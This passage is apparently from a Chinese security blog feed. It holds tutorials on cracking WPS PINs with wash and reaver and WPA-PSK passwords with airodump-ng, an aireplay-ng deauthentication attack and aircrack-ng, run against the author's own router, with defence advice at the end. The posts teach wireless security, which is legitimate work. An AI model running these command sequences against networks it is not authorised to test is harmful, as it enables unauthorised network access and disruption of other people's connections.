<h4 id="2-侦听周围环境中开启WPS服务的设备，下列两种方法都能达到目的"><a href="#2-侦听周围环境中开启WPS服务的设备，下列两种方法都能达到目的" class="headerlink" title="2.侦听周围环境中开启WPS服务的设备，下列两种方法都能达到目的"></a>2.侦听周围环境中开启WPS服务的设备，下列两种方法都能达到目的</h4><h4 id="1-airodump-wlan0mon-wps-开启WPS的设备会显示如下"><a href="#1-airodump-wlan0mon-wps-开启WPS的设备会显示如下" class="headerlink" title="(1)airodump wlan0mon --wps   开启WPS的设备会显示如下"></a>(1)airodump wlan0mon <strong>-</strong>-wps   开启WPS的设备会显示如下</h4><p><img src="http://note.youdao.com/yws/public/resource/9f16df0bf97ad6892a6928427c2acd3e/xmlnote/22302CB608DD4C53BD53B8C8E04ECCCD/1081" alt="image"></p>
<h4 id="2-wash-i-wlan0mon-采用wash命令只会显示开启WPS的设备，但是会显示设备是否已经被锁上，因为有时爆破PIN码时会导致路由器被锁住"><a href="#2-wash-i-wlan0mon-采用wash命令只会显示开启WPS的设备，但是会显示设备是否已经被锁上，因为有时爆破PIN码时会导致路由器被锁住" class="headerlink" title="(2)wash -i wlan0mon 采用wash命令只会显示开启WPS的设备，但是会显示设备是否已经被锁上，因为有时爆破PIN码时会导致路由器被锁住"></a>(2)wash -i wlan0mon 采用wash命令只会显示开启WPS的设备，但是会显示设备是否已经被锁上，因为有时爆破PIN码时会导致路由器被锁住</h4><p><img src="http://note.youdao.com/yws/public/resource/9f16df0bf97ad6892a6928427c2acd3e/xmlnote/747366BE8129447DBDF876DC3C566F5C/1086" alt="image"></p>
<h4 id="3-侦听到开启WPS的设备之后我们就可以开始破解PIN码了，此时也有两种方法，一种是暴力破解，另一种是利用设备漏洞来破解PIN码"><a href="#3-侦听到开启WPS的设备之后我们就可以开始破解PIN码了，此时也有两种方法，一种是暴力破解，另一种是利用设备漏洞来破解PIN码" class="headerlink" title="3.侦听到开启WPS的设备之后我们就可以开始破解PIN码了，此时也有两种方法，一种是暴力破解，另一种是利用设备漏洞来破解PIN码"></a>3.侦听到开启WPS的设备之后我们就可以开始破解PIN码了，此时也有两种方法，一种是暴力破解，另一种是利用设备漏洞来破解PIN码</h4><h4 id="1-利用reaver爆破密码-经过几个小时的爆破基本能猜出来"><a href="#1-利用reaver爆破密码-经过几个小时的爆破基本能猜出来" class="headerlink" title="(1)利用reaver爆破密码,经过几个小时的爆破基本能猜出来"></a>(1)利用reaver爆破密码,经过几个小时的爆破基本能猜出来</h4><p><img src="http://note.youdao.com/yws/public/resource/9f16df0bf97ad6892a6928427c2acd3e/xmlnote/BB96DDDEFD6C4295BAB85DF72B562B57/1094" alt="image"></p>
<h4 id="2-利用设备漏洞破解PIN码，虽然此方法能在极短时间内完成破解，但是如果设备本身不存在漏洞依旧无法成功，下图可以看到尝试失败了"><a href="#2-利用设备漏洞破解PIN码，虽然此方法能在极短时间内完成破解，但是如果设备本身不存在漏洞依旧无法成功，下图可以看到尝试失败了" class="headerlink" title="(2)利用设备漏洞破解PIN码，虽然此方法能在极短时间内完成破解，但是如果设备本身不存在漏洞依旧无法成功，下图可以看到尝试失败了"></a>(2)利用设备漏洞破解PIN码，虽然此方法能在极短时间内完成破解，但是如果设备本身不存在漏洞依旧无法成功，下图可以看到尝试失败了</h4><p><img src="http://note.youdao.com/yws/public/resource/9f16df0bf97ad6892a6928427c2acd3e/xmlnote/A7BD48323F994067BC2F5D93D7CF99B3/1100" alt="image"></p>
<h2 id="0x03-防御措施"><a href="#0x03-防御措施" class="headerlink" title="0x03. 防御措施"></a><strong>0x03. 防御措施</strong></h2><h4 id="emsp-emsp-经过以上测试可以判定WPS是不安全的，为了防御基于WPS的攻击行为，最好的办法就是使用没有WPS功能的路由器，这是最好也是最有效的方法。另外，如果你的路由器具备WPS功能，那么就算你在网关上关闭了WPS功能也很有可能被攻击者利用，所以最好选用不具备此功能的路由器来布置到家中。"><a href="#emsp-emsp-经过以上测试可以判定WPS是不安全的，为了防御基于WPS的攻击行为，最好的办法就是使用没有WPS功能的路由器，这是最好也是最有效的方法。另外，如果你的路由器具备WPS功能，那么就算你在网关上关闭了WPS功能也很有可能被攻击者利用，所以最好选用不具备此功能的路由器来布置到家中。" class="headerlink" title="&emsp;&emsp;经过以上测试可以判定WPS是不安全的，为了防御基于WPS的攻击行为，最好的办法就是使用没有WPS功能的路由器，这是最好也是最有效的方法。另外，如果你的路由器具备WPS功能，那么就算你在网关上关闭了WPS功能也很有可能被攻击者利用，所以最好选用不具备此功能的路由器来布置到家中。"></a>&emsp;&emsp;经过以上测试可以判定WPS是不安全的，为了防御基于WPS的攻击行为，最好的办法就是使用没有WPS功能的路由器，这是最好也是最有效的方法。另外，如果你的路由器具备WPS功能，那么就算你在网关上关闭了WPS功能也很有可能被攻击者利用，所以最好选用不具备此功能的路由器来布置到家中。</h4><h2 id="0x04-结语"><a href="#0x04-结语" class="headerlink" title="0x04. 结语"></a><strong>0x04. 结语</strong></h2><h4 id="emsp-emsp-本篇文章理论知识比较少，主要就只给大家演示了实战过程，相信喜欢速成的读者们比较喜欢吧，但是老实说这样的文章营养价值不大。碍于笔者能力有限不能给大家深度剖析协议原理深感抱歉，在之后的文章中我尽量让大家在不觉得枯燥的同时学到更多的理论原理。下一章会介绍WPA企业账号密码破解，不嫌弃的读者可以继续关注！"><a href="#emsp-emsp-本篇文章理论知识比较少，主要就只给大家演示了实战过程，相信喜欢速成的读者们比较喜欢吧，但是老实说这样的文章营养价值不大。碍于笔者能力有限不能给大家深度剖析协议原理深感抱歉，在之后的文章中我尽量让大家在不觉得枯燥的同时学到更多的理论原理。下一章会介绍WPA企业账号密码破解，不嫌弃的读者可以继续关注！" class="headerlink" title="&emsp;&emsp;本篇文章理论知识比较少，主要就只给大家演示了实战过程，相信喜欢速成的读者们比较喜欢吧，但是老实说这样的文章营养价值不大。碍于笔者能力有限不能给大家深度剖析协议原理深感抱歉，在之后的文章中我尽量让大家在不觉得枯燥的同时学到更多的理论原理。下一章会介绍WPA企业账号密码破解，不嫌弃的读者可以继续关注！"></a>&emsp;&emsp;本篇文章理论知识比较少，主要就只给大家演示了实战过程，相信喜欢速成的读者们比较喜欢吧，但是老实说这样的文章营养价值不大。碍于笔者能力有限不能给大家深度剖析协议原理深感抱歉，在之后的文章中我尽量让大家在不觉得枯燥的同时学到更多的理论原理。下一章会介绍WPA企业账号密码破解，不嫌弃的读者可以继续关注！</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[无线渗透(上)--WPA加密]]></title>
      <url>/2017/08/30/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F(%E4%B8%8A)--WPA%E5%8A%A0%E5%AF%86/</url>
      <content type="html"><![CDATA[<h2 id="0x00-无线渗透简介"><a href="#0x00-无线渗透简介" class="headerlink" title="0x00. 无线渗透简介"></a>0x00. 无线渗透简介</h2><h4 id="emsp-emsp-在网络越来越发达的今天，相信家家户户都已经连上了无线Wi-Fi，然而在享受Wi-Fi带来的便捷性的同时，大家是否想过正是这小小的Wi-Fi却能成为黑客成功入侵计算机，盗取机密信息的踏板！？接下来笔者会写一个系列的无线渗透文章，为大家逐个分析Wi-Fi破解，破解之后黑客的攻击手段，无线AP的伪造以及中间人攻击，相信大家能在目睹Wi-Fi脆弱性的同时提高自我保护意识。此系列文章仅作技术研究，请勿他用"><a href="#emsp-emsp-在网络越来越发达的今天，相信家家户户都已经连上了无线Wi-Fi，然而在享受Wi-Fi带来的便捷性的同时，大家是否想过正是这小小的Wi-Fi却能成为黑客成功入侵计算机，盗取机密信息的踏板！？接下来笔者会写一个系列的无线渗透文章，为大家逐个分析Wi-Fi破解，破解之后黑客的攻击手段，无线AP的伪造以及中间人攻击，相信大家能在目睹Wi-Fi脆弱性的同时提高自我保护意识。此系列文章仅作技术研究，请勿他用" class="headerlink" title="&emsp;&emsp;在网络越来越发达的今天，相信家家户户都已经连上了无线Wi-Fi，然而在享受Wi-Fi带来的便捷性的同时，大家是否想过正是这小小的Wi-Fi却能成为黑客成功入侵计算机，盗取机密信息的踏板！？接下来笔者会写一个系列的无线渗透文章，为大家逐个分析Wi-Fi破解，破解之后黑客的攻击手段，无线AP的伪造以及中间人攻击，相信大家能在目睹Wi-Fi脆弱性的同时提高自我保护意识。此系列文章仅作技术研究，请勿他用!"></a>&emsp;&emsp;在网络越来越发达的今天，相信家家户户都已经连上了无线Wi-Fi，然而在享受Wi-Fi带来的便捷性的同时，大家是否想过正是这小小的Wi-Fi却能成为黑客成功入侵计算机，盗取机密信息的踏板！？接下来笔者会写一个系列的无线渗透文章，为大家逐个分析Wi-Fi破解，破解之后黑客的攻击手段，无线AP的伪造以及中间人攻击，相信大家能在目睹Wi-Fi脆弱性的同时提高自我保护意识。此系列文章仅作技术研究，请勿他用!</h4><a id="more"></a>
<h2 id="0x01-协议分析"><a href="#0x01-协议分析" class="headerlink" title="0x01. 协议分析"></a><strong>0x01. 协议分析</strong></h2><p><img src="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/9CB410665DDB4B4F98F1E69275D43BBB/699" alt="image"></p>
<h4 id="emsp-emsp-无线Wi-Fi能够传递、接受信号不仅依赖于物理硬件的支持（在物理层将数据信息转换为电子信号，通过无线电波传递到周围空气当中），更借助其上层数据链路层提供的逻辑标准来控制信息传递的有序进行。-而我们的Wi-Fi就是依赖数据链路层的802-11协议，经过多年的发展，IEEE组织已经制定了不同的协议族，正如上图所示，过去常用的是802-11b但是由于传输速度的限制现在大多数的网卡都已经开始支持802-11n-下面是笔者的Mac支持的协议。后面可能会涉及到数据包的传输过程，大家可以先去了解一下详细的802-11协议，以便更好理解后面内容。"><a href="#emsp-emsp-无线Wi-Fi能够传递、接受信号不仅依赖于物理硬件的支持（在物理层将数据信息转换为电子信号，通过无线电波传递到周围空气当中），更借助其上层数据链路层提供的逻辑标准来控制信息传递的有序进行。-而我们的Wi-Fi就是依赖数据链路层的802-11协议，经过多年的发展，IEEE组织已经制定了不同的协议族，正如上图所示，过去常用的是802-11b但是由于传输速度的限制现在大多数的网卡都已经开始支持802-11n-下面是笔者的Mac支持的协议。后面可能会涉及到数据包的传输过程，大家可以先去了解一下详细的802-11协议，以便更好理解后面内容。" class="headerlink" title="&emsp;&emsp;无线Wi-Fi能够传递、接受信号不仅依赖于物理硬件的支持（在物理层将数据信息转换为电子信号，通过无线电波传递到周围空气当中），更借助其上层数据链路层提供的逻辑标准来控制信息传递的有序进行。 而我们的Wi-Fi就是依赖数据链路层的802.11协议，经过多年的发展，IEEE组织已经制定了不同的协议族，正如上图所示，过去常用的是802.11b但是由于传输速度的限制现在大多数的网卡都已经开始支持802.11n,下面是笔者的Mac支持的协议。后面可能会涉及到数据包的传输过程，大家可以先去了解一下详细的802.11协议，以便更好理解后面内容。"></a>&emsp;&emsp;无线Wi-Fi能够传递、接受信号不仅依赖于物理硬件的支持（在物理层将数据信息转换为电子信号，通过无线电波传递到周围空气当中），更借助其上层数据链路层提供的逻辑标准来控制信息传递的有序进行。 而我们的Wi-Fi就是依赖数据链路层的802.11协议，经过多年的发展，IEEE组织已经制定了不同的协议族，正如上图所示，过去常用的是802.11b但是由于传输速度的限制现在大多数的网卡都已经开始支持802.11n,下面是笔者的Mac支持的协议。后面可能会涉及到数据包的传输过程，大家可以先去了解一下<a href="http://blog.csdn.net/cupidove/article/details/23122213" target="_blank" rel="external">详细的802.11协议</a>，以便更好理解后面内容。</h4><p><img src="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/5DD04579426246628D480168D104711B/748" alt="image"></p>
<hr>
<h2 id="0x02-WPA简介"><a href="#0x02-WPA简介" class="headerlink" title="0x02. WPA简介"></a><strong>0x02. WPA简介</strong></h2><h4 id="emsp-emsp-无线通信中WPA2是目前个人用户用得最广的加密协议，企业用的最广的是企业级WPA2，而WEP加密因为被认为很不安全，所以很少会有使用，但是也存在极少个例不太懂安全的人使用，后面的文章都会有介绍。本文笔者先从WPA的攻击开始介绍，WPA2的攻击过程类似。"><a href="#emsp-emsp-无线通信中WPA2是目前个人用户用得最广的加密协议，企业用的最广的是企业级WPA2，而WEP加密因为被认为很不安全，所以很少会有使用，但是也存在极少个例不太懂安全的人使用，后面的文章都会有介绍。本文笔者先从WPA的攻击开始介绍，WPA2的攻击过程类似。" class="headerlink" title="&emsp;&emsp;无线通信中WPA2是目前个人用户用得最广的加密协议，企业用的最广的是企业级WPA2，而WEP加密因为被认为很不安全，所以很少会有使用，但是也存在极少个例不太懂安全的人使用，后面的文章都会有介绍。本文笔者先从WPA的攻击开始介绍，WPA2的攻击过程类似。"></a>&emsp;&emsp;无线通信中WPA2是目前个人用户用得最广的加密协议，企业用的最广的是企业级WPA2，而WEP加密因为被认为很不安全，所以很少会有使用，但是也存在极少个例不太懂安全的人使用，后面的文章都会有介绍。本文笔者先从WPA的攻击开始介绍，WPA2的攻击过程类似。</h4><hr>
<h2 id="0x03-WPA密钥交换流程"><a href="#0x03-WPA密钥交换流程" class="headerlink" title="0x03. WPA密钥交换流程"></a><strong>0x03. WPA密钥交换流程</strong></h2><p><img src="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/003B6F229A3244159C233A04F3D76503/756" alt="image"></p>
<h3 id="emsp-emsp-虽然WPA加密算法十分安全可靠，但是在密钥交换时却不能保证握手过程不被黑客嗅探到。如上图所示，WPA密钥交换要经过四步握手过程，这和TCP握手类似"><a href="#emsp-emsp-虽然WPA加密算法十分安全可靠，但是在密钥交换时却不能保证握手过程不被黑客嗅探到。如上图所示，WPA密钥交换要经过四步握手过程，这和TCP握手类似" class="headerlink" title="&emsp;&emsp;虽然WPA加密算法十分安全可靠，但是在密钥交换时却不能保证握手过程不被黑客嗅探到。如上图所示，WPA密钥交换要经过四步握手过程，这和TCP握手类似"></a>&emsp;&emsp;虽然WPA加密算法十分安全可靠，但是在密钥交换时却不能保证握手过程不被黑客嗅探到。如上图所示，WPA密钥交换要经过四步握手过程，这和TCP握手类似</h3><h4 id="emsp-emsp-1-首先由AP-可以通俗理解为Wi-Fi-发送ANonce给STATION-客户端-；"><a href="#emsp-emsp-1-首先由AP-可以通俗理解为Wi-Fi-发送ANonce给STATION-客户端-；" class="headerlink" title="&emsp;&emsp;1.首先由AP(可以通俗理解为Wi-Fi)发送ANonce给STATION(客户端)；"></a>&emsp;&emsp;1.首先由AP(可以通俗理解为Wi-Fi)发送ANonce给STATION(客户端)；</h4><h4 id="emsp-emsp-2-STA接收到ANonce之后利用正确的Essid-Wi-Fi名称-和PSK-共享密钥，即密码-经过迭代算法计算出PMK，然后STA再自己生成一个SNonce，此时STA同时拥有ANonce、SNonce、PMK、AP-MAC、STA-MAC，利用这些已知信息STA经过散列算法就可以计算出PTK（密钥流，后续就用PTK来加密数据包），接下来STA就把SNonce和PTK的MIC值发送给AP；"><a href="#emsp-emsp-2-STA接收到ANonce之后利用正确的Essid-Wi-Fi名称-和PSK-共享密钥，即密码-经过迭代算法计算出PMK，然后STA再自己生成一个SNonce，此时STA同时拥有ANonce、SNonce、PMK、AP-MAC、STA-MAC，利用这些已知信息STA经过散列算法就可以计算出PTK（密钥流，后续就用PTK来加密数据包），接下来STA就把SNonce和PTK的MIC值发送给AP；" class="headerlink" title="&emsp;&emsp;2.STA接收到ANonce之后利用正确的Essid(Wi-Fi名称)和PSK(共享密钥，即密码)经过迭代算法计算出PMK，然后STA再自己生成一个SNonce，此时STA同时拥有ANonce、SNonce、PMK、AP MAC、STA MAC，利用这些已知信息STA经过散列算法就可以计算出PTK（密钥流，后续就用PTK来加密数据包），接下来STA就把SNonce和PTK的MIC值发送给AP；"></a>&emsp;&emsp;2.STA接收到ANonce之后利用正确的Essid(Wi-Fi名称)和PSK(共享密钥，即密码)经过迭代算法计算出PMK，然后STA再自己生成一个SNonce，此时STA同时拥有ANonce、SNonce、PMK、AP MAC、STA MAC，利用这些已知信息STA经过散列算法就可以计算出PTK（密钥流，后续就用PTK来加密数据包），接下来STA就把SNonce和PTK的MIC值发送给AP；</h4><h4 id="emsp-emsp-3-AP拿到SNonce之后也拥有了ANonce、SNonce、PMK、AP-MAC、STA-MAC（AP也可以生成PMK），得到这些信息之后AP也计算出PTK，通过比较PTK的MIC值来判断密码是否正确和数据是否被篡改，接下来由AP发送GTK和MIC值给STA；"><a href="#emsp-emsp-3-AP拿到SNonce之后也拥有了ANonce、SNonce、PMK、AP-MAC、STA-MAC（AP也可以生成PMK），得到这些信息之后AP也计算出PTK，通过比较PTK的MIC值来判断密码是否正确和数据是否被篡改，接下来由AP发送GTK和MIC值给STA；" class="headerlink" title="&emsp;&emsp;3.AP拿到SNonce之后也拥有了ANonce、SNonce、PMK、AP MAC、STA MAC（AP也可以生成PMK），得到这些信息之后AP也计算出PTK，通过比较PTK的MIC值来判断密码是否正确和数据是否被篡改，接下来由AP发送GTK和MIC值给STA；"></a>&emsp;&emsp;3.AP拿到SNonce之后也拥有了ANonce、SNonce、PMK、AP MAC、STA MAC（AP也可以生成PMK），得到这些信息之后AP也计算出PTK，通过比较PTK的MIC值来判断密码是否正确和数据是否被篡改，接下来由AP发送GTK和MIC值给STA；</h4><h4 id="emsp-emsp-4-STA也要通过比对MIC值来判断数据是否被篡改，如果MIC值相同则回送一个用密钥加密过的ACK给AP确定，此时密钥交换完成。"><a href="#emsp-emsp-4-STA也要通过比对MIC值来判断数据是否被篡改，如果MIC值相同则回送一个用密钥加密过的ACK给AP确定，此时密钥交换完成。" class="headerlink" title="&emsp;&emsp;4.STA也要通过比对MIC值来判断数据是否被篡改，如果MIC值相同则回送一个用密钥加密过的ACK给AP确定，此时密钥交换完成。"></a>&emsp;&emsp;4.STA也要通过比对MIC值来判断数据是否被篡改，如果MIC值相同则回送一个用密钥加密过的ACK给AP确定，此时密钥交换完成。</h4><hr>
<h2 id="0x04-WPA-PSK攻击原理"><a href="#0x04-WPA-PSK攻击原理" class="headerlink" title="0x04. WPA PSK攻击原理"></a><strong>0x04. WPA PSK攻击原理</strong></h2><h4 id="emsp-emsp-上面介绍了WPA密钥交换原理，而我们的攻击过程正是要利用这个原理来实现的，所以笔者希望大家能够试图看懂上面介绍的原理流程。"><a href="#emsp-emsp-上面介绍了WPA密钥交换原理，而我们的攻击过程正是要利用这个原理来实现的，所以笔者希望大家能够试图看懂上面介绍的原理流程。" class="headerlink" title="&emsp;&emsp;上面介绍了WPA密钥交换原理，而我们的攻击过程正是要利用这个原理来实现的，所以笔者希望大家能够试图看懂上面介绍的原理流程。"></a>&emsp;&emsp;上面介绍了WPA密钥交换原理，而我们的攻击过程正是要利用这个原理来实现的，所以笔者希望大家能够试图看懂上面介绍的原理流程。</h4><h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><h4 id="emsp-1-利用抓包工具抓取四步握手过程；"><a href="#emsp-1-利用抓包工具抓取四步握手过程；" class="headerlink" title="&emsp;1.利用抓包工具抓取四步握手过程；"></a>&emsp;1.利用抓包工具抓取四步握手过程；</h4><h4 id="emsp-2-抓取到四步握手之后我们便得到了ANonce、SNonce、Essid、AP-MAC、STA-MAC、MIC-因为PMK-Essid-PSK-迭代计算，所以我们可以尝试用字典来计算出各种PMK，然后生成PTK-MIC值-PTK-MIC-ANonce-SNonce-PMK-AP-MAC-STA-MAC-散列计算-比较抓取到的MIC值，其实这个过程和破解hash是一个道理，主要依赖字典。"><a href="#emsp-2-抓取到四步握手之后我们便得到了ANonce、SNonce、Essid、AP-MAC、STA-MAC、MIC-因为PMK-Essid-PSK-迭代计算，所以我们可以尝试用字典来计算出各种PMK，然后生成PTK-MIC值-PTK-MIC-ANonce-SNonce-PMK-AP-MAC-STA-MAC-散列计算-比较抓取到的MIC值，其实这个过程和破解hash是一个道理，主要依赖字典。" class="headerlink" title="&emsp;2.抓取到四步握手之后我们便得到了ANonce、SNonce、Essid、AP MAC、STA MAC、MIC,因为PMK=Essid + PSK + 迭代计算，所以我们可以尝试用字典来计算出各种PMK，然后生成PTK MIC值(PTK MIC = ANonce + SNonce + PMK + AP MAC + STA MAC + 散列计算)比较抓取到的MIC值，其实这个过程和破解hash是一个道理，主要依赖字典。"></a>&emsp;2.抓取到四步握手之后我们便得到了ANonce、SNonce、Essid、AP MAC、STA MAC、MIC,因为PMK=Essid + PSK + 迭代计算，所以我们可以尝试用字典来计算出各种PMK，然后生成PTK MIC值(PTK MIC = ANonce + SNonce + PMK + AP MAC + STA MAC + 散列计算)比较抓取到的MIC值，其实这个过程和破解hash是一个道理，主要依赖字典。</h4><hr>
<h2 id="0x05-WPA攻击实战"><a href="#0x05-WPA攻击实战" class="headerlink" title="0x05. WPA攻击实战"></a><strong>0x05. WPA攻击实战</strong></h2><h4 id="emsp-emsp-介绍了这么多，相信大家已经摩拳擦掌，准备拿自己的Wi-Fi下手了，下面笔者演示实操攻破自己的Wi-Fi。"><a href="#emsp-emsp-介绍了这么多，相信大家已经摩拳擦掌，准备拿自己的Wi-Fi下手了，下面笔者演示实操攻破自己的Wi-Fi。" class="headerlink" title="&emsp;&emsp;介绍了这么多，相信大家已经摩拳擦掌，准备拿自己的Wi-Fi下手了，下面笔者演示实操攻破自己的Wi-Fi。"></a>&emsp;&emsp;介绍了这么多，相信大家已经摩拳擦掌，准备拿自己的Wi-Fi下手了，下面笔者演示实操攻破自己的Wi-Fi。</h4><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h4 id="emsp-1-kali-Linux虚拟机"><a href="#emsp-1-kali-Linux虚拟机" class="headerlink" title="&emsp;1.kali Linux虚拟机"></a>&emsp;1.kali Linux虚拟机</h4><h4 id="emsp-2-TL-WN722N网卡"><a href="#emsp-2-TL-WN722N网卡" class="headerlink" title="&emsp;2.TL-WN722N网卡"></a>&emsp;2.TL-WN722N网卡</h4><h4 id="emsp-3-Wi-Fi密码为admin123的路由器"><a href="#emsp-3-Wi-Fi密码为admin123的路由器" class="headerlink" title="&emsp;3.Wi-Fi密码为admin123的路由器"></a>&emsp;3.Wi-Fi密码为admin123的路由器</h4><p><img src="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/63067782993749B08166DC5D3FE8BEA2/883" alt="image"><br><img src="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/135817F3256741E6A946E1B9706C27AD/913" alt="image"></p>
<h3 id="操作流程"><a href="#操作流程" class="headerlink" title="操作流程"></a>操作流程</h3><h4 id="emsp-1-启动kali-Linux虚拟机，映射网卡"><a href="#emsp-1-启动kali-Linux虚拟机，映射网卡" class="headerlink" title="&emsp;1.启动kali Linux虚拟机，映射网卡"></a>&emsp;1.启动kali Linux虚拟机，映射网卡</h4><p><img src="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/F2E877559EA14CD9A3D22AF94B5DE207/891" alt="image"></p>
<h4 id="emsp-2-启动网卡，设置为monitor模式"><a href="#emsp-2-启动网卡，设置为monitor模式" class="headerlink" title="&emsp;2.启动网卡，设置为monitor模式"></a>&emsp;2.启动网卡，设置为monitor模式</h4><blockquote>
<p>airmon-ng start wlan0 &amp;&amp; iwconfig</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/95502CABB90F4DF79FA602AE292801C9/909" alt="image"></p>
<h4 id="emsp-3-airodump-ng-启动监听，可以看到我的Wi-Fi–TimeS0ng"><a href="#emsp-3-airodump-ng-启动监听，可以看到我的Wi-Fi–TimeS0ng" class="headerlink" title="&emsp;3. airodump-ng 启动监听，可以看到我的Wi-Fi–TimeS0ng"></a>&emsp;3. airodump-ng 启动监听，可以看到我的Wi-Fi–TimeS0ng</h4><blockquote>
<p>airodump-ng wlan0mon</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180303131705_B6RuT1_Screenshot.jpeg" alt=""></p>
<h4 id="emsp-4-启动airodump-ng进行抓包侦听"><a href="#emsp-4-启动airodump-ng进行抓包侦听" class="headerlink" title="&emsp;4.启动airodump-ng进行抓包侦听"></a>&emsp;4.启动airodump-ng进行抓包侦听</h4><blockquote>
<p>airodump-ng wlan0mon -c 11 <strong>-</strong>-essid TimeS0ng -w wifi_TimeS0ng</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/7DC28669142B44EEBFB4F75AD6887744/918" alt="image"></p>
<h4 id="emsp-5-利用aireplay-ng-aireplay-0-3-a-AP-MAC-c-STA-MAC-interface-emsp-迫使MAC为-98-01-A7-C5-F7-6D的主机下线重连Wi-Fi，以便抓取四步握手"><a href="#emsp-5-利用aireplay-ng-aireplay-0-3-a-AP-MAC-c-STA-MAC-interface-emsp-迫使MAC为-98-01-A7-C5-F7-6D的主机下线重连Wi-Fi，以便抓取四步握手" class="headerlink" title="&emsp;5.利用aireplay-ng(aireplay -0 3 -a [AP MAC] -c [STA MAC] [interface] &emsp;迫使MAC为 98:01:A7:C5:F7:6D的主机下线重连Wi-Fi，以便抓取四步握手"></a>&emsp;5.利用aireplay-ng(aireplay -0 3 -a [AP MAC] -c [STA MAC] [interface] &emsp;迫使MAC为 98:01:A7:C5:F7:6D的主机下线重连Wi-Fi，以便抓取四步握手</h4><blockquote>
<p>aireplay-ng -0 3 -a E4:F3:F5:2D:55:A8 -c 98:01:A7:C5:F7:6D wlan0mon</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/1AF5BBD248E54CB8AB60B5D4F144D421/926" alt="image"></p>
<h4 id="emsp-6-调用aircrack-ng破解密码-aircrack-ng-w-wordlist-txt-wpa-01-cap"><a href="#emsp-6-调用aircrack-ng破解密码-aircrack-ng-w-wordlist-txt-wpa-01-cap" class="headerlink" title="&emsp;6.调用aircrack-ng破解密码(aircrack-ng -w [wordlist.txt] wpa-01.cap)"></a>&emsp;6.调用aircrack-ng破解密码(aircrack-ng -w [wordlist.txt] wpa-01.cap)</h4><blockquote>
<p>aircrack-ng -w /usr/share/sqlmap/txt/wordlist.txt wifi_TimeS0ng-01.cap</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/1b76f7e1beb93f9e28e44bca46fca90a/xmlnote/3391248596AF4F8A923ADDE0CE28F2E4/936" alt="image"></p>
<hr>
<h2 id="0x06-防御"><a href="#0x06-防御" class="headerlink" title="0x06. 防御"></a><strong>0x06. 防御</strong></h2><h4 id="emsp-emsp-其实基于WPA加密的Wi-Fi是很不容易破解的，只要密码设的足够复杂，就算是黑客也不是那么轻松就能攻破的，所以大家还是尽早放弃弱密码吧，免得江湖上又一轮腥风血雨。"><a href="#emsp-emsp-其实基于WPA加密的Wi-Fi是很不容易破解的，只要密码设的足够复杂，就算是黑客也不是那么轻松就能攻破的，所以大家还是尽早放弃弱密码吧，免得江湖上又一轮腥风血雨。" class="headerlink" title="&emsp;&emsp;其实基于WPA加密的Wi-Fi是很不容易破解的，只要密码设的足够复杂，就算是黑客也不是那么轻松就能攻破的，所以大家还是尽早放弃弱密码吧，免得江湖上又一轮腥风血雨。"></a>&emsp;&emsp;其实基于WPA加密的Wi-Fi是很不容易破解的，只要密码设的足够复杂，就算是黑客也不是那么轻松就能攻破的，所以大家还是尽早放弃弱密码吧，免得江湖上又一轮腥风血雨。</h4><hr>
<h2 id="0x06-后续"><a href="#0x06-后续" class="headerlink" title="0x06. 后续"></a><strong>0x06. 后续</strong></h2><h4 id="emsp-emsp-大家也可以实战试试能否破解自己家的Wi-Fi，接下来会推出wps和wep的密码破解，关于破解Wi-Fi密码之后的攻击手法也会在后面陆续推出，感兴趣的朋友可以关注公众号动态，喜欢的朋友可以分享到朋友圈帮忙将知识分享给更多的人！！"><a href="#emsp-emsp-大家也可以实战试试能否破解自己家的Wi-Fi，接下来会推出wps和wep的密码破解，关于破解Wi-Fi密码之后的攻击手法也会在后面陆续推出，感兴趣的朋友可以关注公众号动态，喜欢的朋友可以分享到朋友圈帮忙将知识分享给更多的人！！" class="headerlink" title="&emsp;&emsp;大家也可以实战试试能否破解自己家的Wi-Fi，接下来会推出wps和wep的密码破解，关于破解Wi-Fi密码之后的攻击手法也会在后面陆续推出，感兴趣的朋友可以关注公众号动态，喜欢的朋友可以分享到朋友圈帮忙将知识分享给更多的人！！"></a>&emsp;&emsp;大家也可以实战试试能否破解自己家的Wi-Fi，接下来会推出wps和wep的密码破解，关于破解Wi-Fi密码之后的攻击手法也会在后面陆续推出，感兴趣的朋友可以关注公众号动态，喜欢的朋友可以分享到朋友圈帮忙将知识分享给更多的人！！</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[信息收集— 僵尸扫描]]></title>
      <url>/2017/08/29/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%20%E5%83%B5%E5%B0%B8%E6%89%AB%E6%8F%8F/</url>
